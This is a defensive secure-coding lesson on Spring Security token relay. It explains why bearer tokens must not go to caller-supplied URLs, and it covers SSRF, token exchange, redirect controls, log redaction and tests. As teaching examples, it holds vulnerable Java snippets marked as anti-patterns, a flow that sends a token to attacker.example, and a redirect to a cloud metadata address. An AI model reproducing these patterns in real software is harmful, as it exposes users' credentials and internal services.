# Never Forward Tokens Arbitrarily to User-Supplied URLs

In a **Spring Security OAuth 2.0 / OIDC Resource Server**, an API sometimes needs to call another service on behalf of the user: fetching inventory, reading a profile, checking payments, or querying a partner system. A dangerous design mistake is accepting a URL from the request and sending an HTTP request to that URL carrying the **current user's Access Token**.

For example:

~~~http
POST /api/fetch HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_ACCESS_TOKEN

{
  "url": "https://some-host.example/path"
}
~~~

If the backend does the following:

~~~java
webClient.get()
    .uri(userSuppliedUrl)
    .headers(headers ->
        headers.setBearerAuth(currentAccessToken))
    .retrieve();
~~~

then the caller controls **where the Bearer Token is sent**. If the URL points to an attacker-controlled server, the token can be exfiltrated. If the URL points to an internal address, cloud metadata service, or administrative service, the backend can also become an **SSRF proxy** carrying privileged credentials.

**Core rule:** *Never attach Access Tokens, ID Tokens, Refresh Tokens, session cookies, or internal credentials to requests targeting arbitrary user-supplied URLs.* Tokens may only be sent to **resource servers explicitly identified and permitted by application policy**, with the right audience, scope, and delegation mechanism.

If the business requirement genuinely needs users to supply a URL, treat that URL as **untrusted input data**. Process it using a separate, credential-less HTTP client with dedicated SSRF/egress policies. If accessing a downstream OAuth resource is required, map the operation to a **target registered in trusted configuration** or use OAuth Token Exchange to obtain a token dedicated to that resource.

This lesson belongs to the **Token Relay** chapter, using **Java 17+, Spring Boot 3.x, and Spring Security 6.x** as context. It explains token exfiltration, SSRF, confused deputy, audience and scope, token relay, OAuth Token Exchange, URL allowlists, redirect/DNS controls, WebClient/Spring Security integration, logging, and testing.

## 1. Why Is Forwarding Tokens to Arbitrary URLs Dangerous?

A Bearer Access Token is a credential: any party holding the token can attempt to use it. When the backend sends the token to another target, the backend is **delegating possession of a credential capable of accessing resources to that target**.

~~~text
User
  |
  | Authorization: Bearer T
  | body.url = https://attacker.example/collect
  v
Your API (authenticated user)
  |
  | GET https://attacker.example/collect
  | Authorization: Bearer T
  v
Attacker server
  |
  +-- receives and stores token T
  +-- replays T to any API that might accept it
~~~

If T grants permission to read profiles, orders, or tenant data, the attacker can use the token within those permissions until it expires or is revoked. The fact that the backend authenticated the user before forwarding the token **does not make a user-supplied URL a trusted recipient**.

### 1.1. Three Risks Occur Simultaneously

**Token exfiltration:** the backend sends a Bearer Token to an unauthorized host. That host can store, inspect, or replay the token.

**Server-Side Request Forgery (SSRF):** an attacker tricks the backend into connecting to addresses the attacker cannot reach directly, such as loopback, private networks, admin endpoints, or cloud metadata services.

**Confused deputy:** the backend possesses network access and application credentials, and is tricked into exercising those privileges on behalf of a caller who lacks the corresponding authorization.

~~~text
Untrusted URL
    |
    v
Backend uses its own network identity
    |
    +-- sends user's token
    +-- accesses internal network
    +-- calls admin API
    |
    v
Caller gains privileges they do not directly have
~~~

This is a flaw in **credential and privilege routing**, not merely a URL string validation bug.

## 2. A User-Supplied URL Is Not a Resource Registration

An application may need to call multiple downstream services, but those services must be defined in configuration controlled by the operations team:

| Downstream | Trusted Base URI | Resource/Audience | Permitted Rights |
| --- | --- | --- | --- |
| Inventory API | `https://inventory.internal.example` | `inventory-api` | `inventory.read` |
| Billing API | `https://billing.internal.example` | `billing-api` | `billing.read` |
| Orders API | `https://orders.internal.example` | `orders-api` | `orders.read`, `orders.write` |

The client can request a business action such as "look up inventory for SKU-42." The backend selects the Inventory API from its registry and constructs the path/query per contract. The client **must not send `https://arbitrary-host` to decide where the Access Token gets sent**.

### 2.1. Distinguishing Locator, Resource, and Credential

| Value | Can Come from Request? | What Does It Determine? |
| --- | --- | --- |
| SKU/order ID | Yes, after validation. | Selects the business resource. |
| Feature name `inventory` | Can be accepted as an enum/operation key. | Selects a registered downstream service. |
| Raw URL | Can be input to a credential-less fetch feature. | Must never choose a token recipient. |
| Audience/resource ID | Only per server-side policy. | Which resource the token should be issued for. |
| OAuth client registration ID | Server-side configuration. | Which credential/client flow is used to acquire a token. |
| Current Access Token | Provided by the authentication layer. | May only be relayed when downstream is permitted to receive that exact token. |

**A URL, hostname, tenant slug, or service name sent by the caller does not prove the caller is authorized to receive a token.**

### 2.2. Designing APIs with Operation Keys

Instead of:

~~~json
{
  "url": "https://any-host.example/api/orders/42"
}
~~~

design:

~~~json
{
  "operation": "inventory.lookup",
  "sku": "SKU-42"
}
~~~

The backend maps `inventory.lookup` to the registered Inventory API. The client only chooses an **approved business operation**, never the network destination or token audience.

## 3. Tokens Are Only for Resources with Matching Audiences

An Access Token can carry the `aud` claim to specify the target resource server:

~~~json
{
  "iss": "https://identity.example.test",
  "sub": "person-42",
  "aud": ["orders-api"],
  "scope": "orders.read",
  "exp": 1893456000
}
~~~

The token above was issued for `orders-api`. Sending it to:

~~~text
https://attacker.example/collect
https://billing.internal.example
https://admin.internal.example
~~~

does not make it a valid token for those hosts. A properly designed resource server verifies issuer, audience, expiration, signature/introspection, and permissions. However, **never rely on downstream rejecting the token to protect secrecy**: the receiving host or a proxy in front of it can still capture the raw token before checking it.

### 3.1. Audience Is Not a Hostname

Audience is typically a resource identifier per the Authorization Server contract. It may be a URI or a resource ID string, but an audience must never be derived automatically from a user-supplied URL.

~~~text
User URL: https://billing.example.test
Does not mean:
  requested_audience = "https://billing.example.test"
~~~

If clients are allowed to request arbitrary audiences, the backend can become a token minting/delegation proxy. Use server-side mapping:

~~~text
operation = inventory.lookup
        |
        v
trusted downstream = INVENTORY
        |
        v
resource = inventory-api
scope = inventory.read
~~~

### 3.2. Scope Does Not Compensate for a Wrong Audience

A token with `scope=orders.read` is not automatically permitted to be sent to every API that happens to have an `/orders` endpoint. Audience and scope answer two distinct questions:

- **Audience:** which resource is the token intended for?
- **Scope:** which group of actions is the token permitted to perform per contract?

The Resource Server must check both. Nor may the backend send a token to a different resource hoping a narrow scope will protect it.

## 4. Distinguishing Token Relay from Token Exchange

The two mechanisms serve different purposes.

### 4.1. Token Relay: Forwarding the Exact Current Token

Token relay sends the current Access Token to a designated downstream service:

~~~text
Browser -- Bearer T_orders --> API Gateway
                                  |
                                  | Bearer T_orders
                                  v
                              Orders Service
~~~

Relay is only appropriate when downstream is **a resource the token was issued for**, shares an appropriate trust boundary, and policy permits such token delegation. Relay does not change audience, downscope, or mint a new credential.

### 4.2. Token Exchange: Requesting a Token for Another Resource

If API A needs to call API B with appropriate identity/delegation, **OAuth 2.0 Token Exchange** per RFC 8693 can be used if supported by the Authorization Server:

~~~text
Client -- Access Token T_A --> API A
                                  |
                                  | subject_token = T_A
                                  | requested resource = B
                                  v
                         Authorization Server
                                  |
                                  | Access Token T_B
                                  | aud = B
                                  | scope = minimal
                                  v
                              API A -- T_B --> API B
~~~

T_B is a token issued by the AS per policy for resource B. The backend does not edit T_A's `aud` or `scope` itself; issuing new credentials is decided by the AS.

### 4.3. Comparison Table

| Criterion | Token Relay | Token Exchange |
| --- | --- | --- |
| Token downstream receives | The exact current Access Token. | A new token issued by the AS. |
| Audience | Must already match downstream. | Can request a different resource/audience per AS policy. |
| Scope | Does not change on its own. | AS can downscope/enforce delegation rights. |
| New credential | No. | Yes. |
| When to use | Downstream belongs to the same resource trust boundary and accepts that token. | Calling a different resource or needing a dedicated token. |
| User-provided URL | Must never determine the recipient. | Must never arbitrarily determine audience/resource. |

### 4.4. Token Exchange Does Not Mean "Let the User Pick Any Audience"

Even when the AS supports RFC 8693, the backend must enforce:

- Which resources/audiences are permitted.
- Which subject token types are permitted for exchange.
- Which clients are authorized to exchange.
- Scope/actor/delegation policies.
- Token lifetimes and sender constraints.
- Relationships between user, tenant, and downstream operation.

Never pass `audience` or `resource` values verbatim from a request into token exchange parameters without policy checks. Token exchange is a **controlled delegation mechanism**, not a proxy endpoint for minting tokens for arbitrary hosts.

## 5. Anti-Patterns to Avoid

### 5.1. Attaching Tokens to a WebClient Accepting Arbitrary URLs

~~~java
// DO NOT DO THIS.
Mono<String> fetch(String url, String accessToken) {
    return WebClient.create()
        .get()
        .uri(url)
        .headers(headers ->
            headers.setBearerAuth(accessToken))
        .retrieve()
        .bodyToMono(String.class);
}
~~~

The caller controls `url`, while the backend supplies the token. This is token exfiltration and potentially SSRF.

### 5.2. Using the Current Authentication to Call Any Host

~~~java
// DO NOT DO THIS.
String target = request.getParameter("url");
webClient.get()
    .uri(target)
    .headers(headers ->
        headers.setBearerAuth(currentBearerToken()))
    .retrieve();
~~~

Retrieving the token from `SecurityContext` does not make the URL safer. `SecurityContext` states that the current request is authenticated; it does not authorize sending credentials to arbitrary hosts.

### 5.3. Constructing a Token Exchange Request Directly from a URL

~~~java
// DO NOT DO THIS.
String resource = request.getParameter("url");
tokenExchangeClient.exchange(
    incomingToken,
    resource
);
~~~

A URL is not a trusted resource identifier. An attacker could cause the AS to issue tokens for resources outside the application's policy if the backend holds broad exchange permissions.

### 5.4. Placing Tokens in Query Parameters

~~~http
GET https://partner.example/fetch?access_token=SECRET
~~~

Tokens can appear in access logs, proxy logs, browser history, analytics, referrers, or observability systems. For HTTP APIs, credentials must travel via the `Authorization` header mechanism per contract; however, **no header choice makes an arbitrary URL a safe recipient**.

## 6. Safe Downstream Selection Workflow

~~~text
1. Authenticate incoming request
          |
2. Validate operation and business input
          |
3. Verify user/tenant is authorized to invoke operation
          |
4. Map operation -> trusted downstream registration
          |
5. Select appropriate token:
     - relay if audience/resource already matches
     - token exchange if a downstream-specific token is needed
          |
6. Call fixed base URI from registry
          |
7. Validate response and map to domain model
~~~

**Authorization governs both the operation and the recipient.** Merely validating a hostname in a helper function without checking whether the user is authorized to call downstream can still create a confused deputy.

### 6.1. Server-Side Target Registry

~~~java
import java.net.URI;
import java.util.Map;

public enum DownstreamService {
    INVENTORY,
    BILLING,
    ORDERS
}

public record DownstreamTarget(
    URI baseUri,
    String clientRegistrationId,
    String resourceId
) {}

public final class DownstreamRegistry {

    private final Map<DownstreamService, DownstreamTarget> targets =
        Map.of(
            DownstreamService.INVENTORY,
            new DownstreamTarget(
                URI.create("https://inventory.internal.example"),
                "inventory-client",
                "inventory-api"),
            DownstreamService.BILLING,
            new DownstreamTarget(
                URI.create("https://billing.internal.example"),
                "billing-client",
                "billing-api"),
            DownstreamService.ORDERS,
            new DownstreamTarget(
                URI.create("https://orders.internal.example"),
                "orders-client",
                "orders-api")
        );

    public DownstreamTarget require(DownstreamService service) {
        DownstreamTarget target = targets.get(service);
        if (target == null) {
            throw new IllegalArgumentException(
                "Downstream service is not registered");
        }
        return target;
    }
}
~~~

This is a static configuration example. In production, the registry may come from a configuration service/secret manager with RBAC and auditing. **Never add new entries from public requests.**

### 6.2. Do Not Accept Raw URIs in Service Methods

Prefer:

~~~java
public Mono<InventoryItem> lookupInventory(String sku) {
    // Target is chosen by the server-side service, not by a caller URL.
    return inventoryClient.get()
        .uri(builder -> builder
            .path("/v1/items/{sku}")
            .build(sku))
        .retrieve()
        .bodyToMono(InventoryItem.class);
}
~~~

Do not design:

~~~java
public Mono<String> callDownstream(URI arbitraryUri) {
    // URI may come from an untrusted request, message, or database.
}
~~~

`WebClient.Builder.baseUrl(...)` **is not a security boundary if code still allows passing an absolute URI**: an absolute URI can override the base URL. Encapsulate `WebClient` inside a narrow adapter, expose domain operations with controlled relative paths, and never accept arbitrary URLs.

## 7. Spring Security: Relaying Tokens to a Trusted Downstream

In Servlet applications, Spring Security provides `ServletBearerExchangeFilterFunction` for `WebClient`. This filter retrieves the Bearer token from `SecurityContext` and adds the `Authorization` header to outbound requests.

~~~java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.server.resource.web.reactive.function.client.ServletBearerExchangeFilterFunction;
import org.springframework.web.reactive.function.client.WebClient;

@Configuration
public class InventoryClientConfiguration {

    @Bean
    WebClient inventoryWebClient(WebClient.Builder builder) {
        return builder
            .baseUrl("https://inventory.internal.example")
            .filter(new ServletBearerExchangeFilterFunction())
            .build();
    }
}
~~~

Adapter calling downstream:

~~~java
import reactor.core.publisher.Mono;
import org.springframework.stereotype.Component;
import org.springframework.web.reactive.function.client.WebClient;

@Component
public class InventoryClient {

    private final WebClient inventoryWebClient;

    public InventoryClient(WebClient inventoryWebClient) {
        this.inventoryWebClient = inventoryWebClient;
    }

    public Mono<InventoryItem> findBySku(String sku) {
        return inventoryWebClient.get()
            .uri(builder -> builder
                .path("/v1/items/{sku}")
                .build(sku))
            .retrieve()
            .bodyToMono(InventoryItem.class);
    }
}
~~~

### 7.1. The Relay Filter Does Not Check Audience for You

`ServletBearerExchangeFilterFunction` is a **mechanism for forwarding the current token**, not a policy engine determining which host/audience may receive the token. It does not turn an Access Token intended for API A into a token intended for API B.

Only use this filter when:

- Downstream is a registered/trusted service.
- The current token has an audience matching downstream per contract.
- Scopes and delegation policies permit the operation.
- No code path allows calling this client with an arbitrary absolute URI.
- Redirects, proxies, and network egress are controlled.

If downstream needs its own token, use OAuth client/token exchange instead of relay.

### 7.2. Be Careful with WebClient baseUrl

The code above uses a relative URI constructed inside `InventoryClient`. Do not expose `WebClient` to controllers so callers can pass URLs:

~~~java
// Do not expose a method like this:
Mono<String> fetch(URI uri) {
    return inventoryWebClient.get()
        .uri(uri)
        .retrieve()
        .bodyToMono(String.class);
}
~~~

An absolute URI can override the base URL. **A fixed base URL is a helpful configuration layer, but typed adapters and input contracts are the actual enforcement boundary.**

### 7.3. The Relay Filter Does Not Refresh Tokens

The relay filter forwards the existing Bearer token in `SecurityContext`; it does not run an OAuth authorization flow or ensure the token remains valid for another resource. If client credentials, refresh, or token exchange is needed, use `OAuth2AuthorizedClientManager`/appropriate client registrations and server-side resource mappings.

## 8. Using OAuth2AuthorizedClientManager for a Dedicated Downstream Client

When the backend has a dedicated client registration for the Inventory API, Spring Security OAuth2 Client can manage the downstream Access Token per registration.

~~~java
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProvider;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.oauth2.client.web.DefaultOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.web.OAuth2AuthorizedClientRepository;

@Configuration
public class OAuthClientConfiguration {

    @Bean
    OAuth2AuthorizedClientManager authorizedClientManager(
            ClientRegistrationRepository registrations,
            OAuth2AuthorizedClientRepository authorizedClients) {

        OAuth2AuthorizedClientProvider provider =
            OAuth2AuthorizedClientProviderBuilder.builder()
                .authorizationCode()
                .refreshToken()
                .clientCredentials()
                .build();

        DefaultOAuth2AuthorizedClientManager manager =
            new DefaultOAuth2AuthorizedClientManager(
                registrations, authorizedClients);

        manager.setAuthorizedClientProvider(provider);
        return manager;
    }
}
~~~

Example client registration configuration:

~~~yaml
spring:
  security:
    oauth2:
      client:
        registration:
          inventory-client:
            provider: company-idp
            client-id: inventory-backend
            client-secret: INVENTORY_CLIENT_SECRET_FROM_SECRET_STORE
            authorization-grant-type: client_credentials
            scope:
              - inventory.read
        provider:
          company-idp:
            token-uri: https://identity.example.test/oauth2/token
~~~

The secret in this example is a placeholder; production must pull it from a secret manager or secure configuration mechanism. With `client_credentials`, the token represents the service/client per AS policy, **not automatically the end user**. If downstream must act on behalf of the user, delegation/token exchange per the AS contract is needed.

### 8.1. Use Known Registration IDs, Never Accept Them Arbitrarily from Requests

A client can select from an enum/operation:

~~~java
String registrationId =
    switch (operation) {
        case INVENTORY_LOOKUP -> "inventory-client";
        case BILLING_STATUS -> "billing-client";
    };
~~~

This is an illustrative mapping. Do not do:

~~~java
String registrationId =
    request.getParameter("oauthClientRegistrationId");
~~~

because a caller could pick a broader-privileged registration, such as an admin API or billing write.

## 9. When Another Resource Must Be Called: Token Exchange

**RFC 8693 — OAuth 2.0 Token Exchange** defines how a client presents a subject token to obtain a new token with a target audience/resource, actor, or delegation rights per policy.

~~~http
POST /oauth2/token HTTP/1.1
Host: identity.example.test
Content-Type: application/x-www-form-urlencoded
Authorization: Basic BACKEND_CLIENT_CREDENTIALS

grant_type=urn:ietf:params:oauth:grant-type:token-exchange&
subject_token=INCOMING_ACCESS_TOKEN&
subject_token_type=urn:ietf:params:oauth:token-type:access_token&
requested_token_type=urn:ietf:params:oauth:token-type:access_token&
audience=inventory-api&
scope=inventory.read
~~~

This is an illustrative example; `audience`/`resource` parameters, actor tokens, and client authentication depend on AS support and profile. Not every Authorization Server implements RFC 8693.

Flow:

1. API A verifies the incoming Access Token.
2. API A checks whether the user/tenant is authorized to perform the operation.
3. Server-side policy selects the `inventory-api` resource.
4. API A calls AS token exchange with the subject token and permitted resource/scope.
5. The AS authenticates the client, subject token, and delegation policy.
6. The AS issues a new token T_B with the appropriate audience/scope.
7. API A calls the Inventory API at its registered base URI using T_B.

**Never send the incoming token to a user-supplied URL**, and never let callers choose arbitrary audiences/resources.

### 9.1. Downscoping

~~~text
Incoming token:
  aud = api-a
  scope = orders.read orders.write billing.read

Exchanged token:
  aud = inventory-api
  scope = inventory.read
~~~

The AS decides whether to permit this exchange. The backend cannot strip claims from the old token or alter `aud` itself and treat the result as a valid credential.

### 9.2. Identity Delegation

The new token can represent the subject token, actor/client, or a delegation chain per AS policy. Audit the actor-subject relationship appropriately without recording raw tokens. Downstream must verify issuer/audience/scope and delegation claims per contract.

## 10. When Users Genuinely Need to Enter a URL

There are legitimate use cases such as downloading public documents, testing a webhook endpoint, importing data from a partner host, or reading a public resource. In such cases, **separate the URL-fetching functionality from credential propagation**.

~~~text
User URL
   |
   v
URL fetch service (no user Access Token)
   |
   +-- URL/scheme/host policy
   +-- DNS/IP and egress policy
   +-- redirect policy
   +-- timeout/size/content-type limits
   |
   v
Untrusted response data
   |
   v
Parse/validate -> domain data
~~~

The fetch service must never attach:

- The user's Bearer token.
- ID Tokens.
- Refresh Tokens.
- Session cookies.
- Internal API keys or cloud credentials.

If a partner requires authentication, use a **registered partner integration** with its own dedicated credential, explicit scope/resource, and controlled host. Never reuse the user's token as a way to log into a partner URL.

## 11. SSRF Controls for Token-Less URL Fetchers

Withholding tokens reduces credential exposure, yet a URL fetcher can still become an SSRF proxy.

### 11.1. Scheme, Host, and Port

Policies should:

- Allow only HTTPS.
- Reject userinfo in URLs such as `https://user:pass@host`.
- Restrict ports, typically only to required ports.
- Use an exact hostname allowlist if the business domain has a fixed set of partners.
- Reject loopback, link-local, private, multicast, reserved, and metadata IP ranges per environment.
- Normalize hostnames/IDN/punycode and check the canonical host.
- Reject URLs with unusual encoding/authority or parser ambiguities.

Do not rely on string checks such as:

~~~java
if (url.startsWith("https://trusted.example")) {
    allow();
}
~~~

because `https://trusted.example.attacker.invalid`, userinfo, ports, encoding, and other URI forms can bypass such checks.

### 11.2. DNS Rebinding and IP Validation

Checking a hostname once and then letting the HTTP client re-resolve it can create a race condition:

~~~text
Validation DNS: host -> public IP
Connection DNS: host -> 127.0.0.1
~~~

Combined countermeasures:

- Resolve and check all A/AAAA records against policy.
- Block egress at the network/firewall/service mesh so requests cannot reach private ranges.
- Use a resolver/connector that ensures connections go to the validated IP while preserving TLS hostname verification.
- Never disable TLS verification just because an IP was pinned.
- Apply defense in depth; application-level validation does not replace network egress restrictions.

### 11.3. Redirects Can Bypass the Initial Allowlist

Suppose the initial URL is valid:

~~~http
GET /file HTTP/1.1
Host: partner.example

HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
~~~

If the HTTP client follows redirects automatically, the backend can reach internal addresses even though the initial URL was allowlisted. Conservative measures:

- Disable automatic redirects for fetchers accepting untrusted URLs.
- If redirects are needed, validate **every hop** with the same URL/IP/port/egress policy.
- Limit the redirect count.
- Never carry `Authorization`/`Cookie` headers across origins.
- Check for HTTPS → HTTP scheme downgrades.

For clients carrying OAuth tokens, the safest option is **disallowing arbitrary redirects**. Never assume a specific HTTP library strips `Authorization` on cross-origin redirects without verifying its version and configuration.

### 11.4. Response Limits

Public URLs can also return huge bodies, wrong content types, compressed-response bombs, never-ending streams, redirect loops, or dangerous headers. Enforce timeouts, post-decompression size limits, content-type restrictions, connection pools, concurrency caps, and cancellation. Parse content strictly against a schema; never render HTML/execute scripts or trust responses as internal data.

## 12. Redirects and Authorization Headers During Token Relay

Even when the backend calls a registered downstream service, define redirect behavior:

~~~text
Trusted API A
  |
  +-- 302 Location: https://other-host.example/path
~~~

If the HTTP client follows redirects, credentials risk being sent to another host depending on the library/version. For requests carrying Access Tokens:

1. Disable redirects by default unless required.
2. If redirects are part of the contract, verify the destination shares the same trusted origin/resource.
3. Never forward the `Authorization` header to another origin.
4. Never automatically resend tokens to a new URL merely because the response was 301/302/307/308.
5. For redirects to a different resource, perform resource selection/token exchange under a separate policy.

**A redirect is a recipient change.** Treat it as a security decision, not merely an HTTP detail.

## 13. Token Relay at the API Gateway and Spring Cloud Gateway

A gateway may provide a filter named `TokenRelay` to pass a user's OAuth2 Access Token to a downstream route. This is convenient when routes are configured as trusted:

~~~text
User -> Gateway
        |
        +-- route /orders/** -> Orders Service
        |       token relay
        |
        +-- route /billing/** -> Billing Service
                token relay or dedicated token exchange
~~~

However, routes must be configured server-side:

- `/orders/**` maps to the registered Orders Service.
- `/billing/**` maps to the registered Billing Service.
- The incoming token must have the appropriate audience/delegation.
- Never construct routes from URLs specified in request bodies/queries/headers.
- Never let callers pick unauthorized internal routes.

`TokenRelay` only forwards tokens; it does not automatically downscope, change audience, or guarantee the token is accepted by the target resource. Verify behavior and configuration for your exact Spring Cloud Gateway version.

## 14. Wrong-Resource Token: Downstream May Reject, Yet the Token Is Still Exposed

A common mistake:

> "No worries, the token has audience `orders-api`; `billing-api` will reject it itself."

The Billing API rightly rejects tokens with the wrong audience. Yet the backend still **sent the token to the Billing host**. The Billing host or a proxy in front of it may log headers, store the request, or be compromised. Audience validation protects access at the resource server; **it does not prevent credentials from leaking on the wire**.

Therefore, two layers are needed:

1. **Recipient control:** never send tokens to hosts not authorized to receive them.
2. **Resource validation:** downstream verifies audience/issuer/scope and relevant claims.

Never use the second layer to compensate for missing the first.

## 15. Which Credentials Must Never Be Relayed Arbitrarily?

| Credential | Can Be Sent to User-Entered URLs? | Why |
| --- | --- | --- |
| User Access Token | **No** | Bearer credential granting resource access. |
| Refresh Token | **No** | Can mint new Access Tokens, often even more sensitive. |
| OIDC ID Token | **No** | Intended for the client/RP to identify the user, not an API bearer credential. |
| Session cookie | **No** | Can hijack the application login session. |
| OAuth client secret | **No** | Can impersonate a confidential client. |
| API key/service token | **No** | Internal credentials may hold broad privileges. |
| mTLS private key | **No** | Private keys must never be sent over HTTP. |
| DPoP private key | **No** | Client-owned private signing key. |

Even when a downstream URL belongs to a legitimate partner, use a **dedicated credential issued for that integration**, rather than arbitrarily borrowing the user's credential.

## 16. Logging, Tracing, and Error Handling

Forwarded tokens can leak outside request bodies:

- HTTP client wire logs.
- Reverse proxy/access logs.
- Distributed tracing span attributes.
- Exception messages containing request headers.
- Metrics labels.
- Debug dumps or heap dumps.

### 16.1. Do Not Log Credentials

Never record:

~~~text
Authorization: Bearer eyJ...
Cookie: SESSION=...
refresh_token=...
client_secret=...
~~~

In logging/tracing, redact:

- `Authorization`.
- `Proxy-Authorization`.
- `Cookie`/`Set-Cookie`.
- `access_token`, `refresh_token`, `id_token`.
- OAuth client credentials and private-key material.

Never log raw URLs whose query strings contain secrets. Avoid logging full response bodies from untrusted URLs; they may contain sensitive data or malicious payloads.

### 16.2. Error Responses Must Not Expose Tokens

When downstream returns 401/403, do not return raw upstream headers/bodies to the caller if they contain tokens, stack traces, or internal hostnames. Map them to appropriate domain/API errors and keep a correlation ID for investigation.

### 16.3. Safely Tracing Outbound Requests

You can log the registered downstream name, operation ID, correlation ID, status code, latency, and error category. Do not log tokens, secrets, or full claims. If you need to correlate authentication events, use protected internal identifiers with bounded retention.

## 17. Testing Against Token Exfiltration and SSRF

Tests must not only confirm that downstream returns 200; they must prove tokens are **only sent to permitted recipients**.

### 17.1. Testing Matrix

| Scenario | Expected Outcome |
| --- | --- |
| Operation `inventory.lookup` | Calls registered Inventory API. |
| Caller sends attacker URL in `url` field | Does not forward token; URL is ignored/rejected per API contract. |
| Caller requests an arbitrary audience | Not used directly; server-side policy decides resource. |
| Caller selects an admin-privileged registration ID | Denied if operation does not permit it. |
| Token `aud=orders-api` relayed to Orders API | Only when policy permits and scopes suffice. |
| Token `aud=orders-api` sent to Billing host | Backend does not send; uses token exchange if permitted. |
| Downstream redirects to attacker host | Does not follow or does not forward credentials. |
| URL fetcher receives loopback/private/link-local | Rejected. |
| DNS returns public then flips to private (rebinding) | Egress controls block internal connections. |
| URL has userinfo/unusual port/encoded host | Rejected per parser/canonicalization policy. |
| HTTP URL or HTTPS downgrade redirect | Rejected. |
| URL fetcher receives oversized response/timeout | Halts within limits. |
| AS token exchange requests non-allowlisted resource | Backend does not send that exchange request. |
| Token exchange returns unexpected audience | Does not call downstream. |
| HTTP client wire logging enabled | Authorization/secrets are redacted. |
| User lacks operation rights but backend has client credentials | Denied before calling downstream. |

### 17.2. Test Proving Tokens Do Not Leave the Trust Boundary

An integration test can stand up:

~~~text
Fake Inventory server:
  records requests and Authorization headers

Fake attacker server:
  records all requests/headers

Application:
  POST /api/inventory/lookup
  POST /api/fetch with attacker URL
~~~

Expectations:

- Valid operation requests reach the Inventory server per token policy.
- Attacker URL requests do not carry the incoming Access Token.
- The attacker server receives no `Authorization` header, `Cookie`, or internal secrets.
- No outbound requests reach private/metadata IPs.
- Redirects from the Inventory server to untrusted origins do not carry credentials.

Never use production credentials in tests. Use fake tokens and isolated test servers.

### 17.3. Testing Token Exchange

1. AS fixture receives the token exchange request.
2. Verify the backend selected the resource from its server-side registry.
3. Send a request with user input attempting to swap audience to an attacker resource.
4. Backend must reject before calling the AS or ignore the disallowed field.
5. When exchange succeeds, verify the new token has the expected audience/scope.
6. Downstream mock verifies the new token, not the incoming token.

## 18. Reference Architectures

### 18.1. Downstream with Same Audience: Controlled Relay

~~~text
Client
  |
  | T (aud=orders-api)
  v
Orders BFF / API
  |
  | operation=read-order
  | trusted target = Orders API
  | relay T
  v
Orders API
  |
  +-- validates T and orders.read
~~~

### 18.2. Downstream with Different Audience: Token Exchange

~~~text
Client
  |
  | T_A (aud=api-a)
  v
API A
  |
  +-- authorize user + operation
  |
  +-- server policy chooses resource B
  |
  +-- RFC 8693 exchange at AS
          |
          v
       T_B (aud=B, reduced scope)
          |
          v
       API B
~~~

### 18.3. User-Entered URL Fetch: No OAuth Credentials

~~~text
Client -> Application -> URL Fetcher (no user token)
                               |
                               +-- URL/SSRF/egress policy
                               +-- no cookies/secrets
                               +-- redirects disabled/validated
                               |
                               v
                         untrusted response
                               |
                               v
                         parse and validate
~~~

These three flows serve distinct purposes. Do not use a URL fetcher in place of token exchange, and do not use token relay to perform arbitrary URL fetching.

## 19. Common Mistakes

| Mistake | Consequence | Correct Approach |
| --- | --- | --- |
| Sending the incoming Bearer token to a URL from the request. | Token exfiltration. | Server-side downstream registry. |
| Thinking the wrong audience automatically protects the token. | Host still receives/stores the raw credential. | Control the recipient before sending. |
| Using `WebClient.baseUrl` while still allowing absolute URIs. | Absolute URIs can override the base URL. | Narrow adapter, relative paths, never accept arbitrary URIs. |
| Letting callers pick the OAuth client registration ID. | Misuse of overly broad client privileges. | Map operation → registration in server policy. |
| Forwarding tokens to another resource instead of exchanging. | Wrong token audience/scope. | RFC 8693/resource-specific tokens. |
| Letting callers pick the audience in token exchange. | Backend becomes a token-minting deputy. | Allowlist resource IDs and enforce authorization. |
| Using an ID Token as an API credential. | Wrong token purpose/audience. | Only use Access Tokens per the resource contract. |
| Forwarding Refresh Tokens. | Exposes credentials that can mint new tokens. | Never relay; keep inside OAuth client lifecycle. |
| Following redirects with the `Authorization` header. | Credentials sent to another origin. | Disable/validate redirects and strip credentials. |
| Validating URLs solely with `startsWith`. | Hostname/userinfo/port/encoding bypasses. | URI parser + canonicalization + allowlist. |
| Checking DNS once then connecting freely. | DNS rebinding/SSRF. | Egress firewall and resolved-address controls. |
| Disabling TLS hostname verification when pinning IPs. | Loss of server authentication. | Preserve TLS verification. |
| Trusting `X-Forwarded-*` from the internet. | Route/host spoofing. | Trust only configured proxies. |
| Logging `Authorization` headers for debugging. | Credential leak. | Redaction and correlation metadata. |
| Using service credentials on behalf of a user without authorization. | Confused deputy, excessive privileges. | Check operation/user/tenant before calling. |
| Using token relay for downstream services with different audiences. | Downstream rejects or token leaks. | Token exchange/downscoping. |
| Letting a URL fetcher use a default `WebClient` with an OAuth filter. | URL fetches accidentally carry tokens. | Dedicated client with no credential filter. |

## 20. Implementation Roadmap

1. **Inventory downstream resources:** base URI, issuer, audience, scopes, client registration, and owner of each integration.
2. **Design APIs by operation:** accept business identifiers/enums, never raw URLs as token recipients.
3. **Check authorization before outbound calls:** user, tenant, operation, and object-level permissions.
4. **Choose relay vs. exchange:** relay only when the current token is already intended for downstream; exchange when a new token/different resource is needed.
5. **Manage OAuth client registrations:** server-side configuration, least privilege, secrets from a secret manager.
6. **Keep `WebClient` per downstream:** fixed base URI, narrow adapter, relative paths; never expose arbitrary absolute URIs.
7. **Control redirects and proxies:** never forward `Authorization` to a new origin, trust only proper gateways and network egress.
8. **Isolate URL fetchers:** no user tokens/cookies/client secrets; SSRF validation, DNS/IP controls, and response limits.
9. **Protect observability:** redact `Authorization`/Cookie/token fields, never log raw upstream bodies.
10. **Test recipients:** attacker hosts, private IPs, redirects, DNS rebinding, token exchange audience tampering, and logging.
11. **Monitor outbound traffic:** downstream registrations, status/latency, egress denials, and token-exchange failures.
12. **Audit every HTTP call path:** `WebClient`, `RestClient`, remaining `RestTemplate`, Feign, Gateway filters, scheduled jobs, and message consumers.

